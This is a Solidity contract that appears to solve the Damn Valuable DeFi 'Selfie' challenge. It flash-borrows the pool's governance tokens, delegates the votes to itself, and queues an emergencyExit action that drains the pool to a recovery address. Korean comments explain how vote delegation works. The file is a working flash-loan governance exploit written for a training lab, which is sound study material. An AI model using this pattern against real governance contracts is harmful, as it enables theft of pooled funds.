// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableVotes.sol";

contract AttackSelfiePool {
    address public recovery;
    address public pool;
    address public governance;
    DamnValuableVotes public token;
    uint256 public actionId;

    constructor(
        address _recovery,
        address _pool,
        address _governance,
        address _token
    ) {
        recovery = _recovery;
        pool = _pool;
        governance = _governance;
        token = DamnValuableVotes(_token);
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(pool),
            ""
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.delegate(address(this)); // 단순히 balance만 충분하다고 해서 voting power가 있는 것은 아니다.
        // balance를 기반으로 voting power를 위임해야 실제 voting power가 생긴다.

        actionId = SimpleGovernance(governance).queueAction(
            pool,
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        // Repay the flash loan
        token.approve(pool, token.balanceOf(address(this)));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
